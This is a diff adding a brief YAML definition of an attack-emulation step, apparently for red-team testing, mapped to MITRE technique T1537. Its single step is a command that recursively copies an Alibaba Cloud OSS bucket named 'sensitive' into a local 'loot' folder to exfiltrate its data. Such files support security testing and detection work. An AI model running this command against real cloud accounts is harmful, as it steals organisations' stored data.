@@ -1,0 +1,7 @@
+name: OSS Data Exfiltration
+description: OSS Data Exfiltration
+mitre_technique: T1537
+stage: Collection
+steps:
+- action: aliyun oss cp oss://sensitive ./loot --recursive
+  description: Exfiltrate OSS content
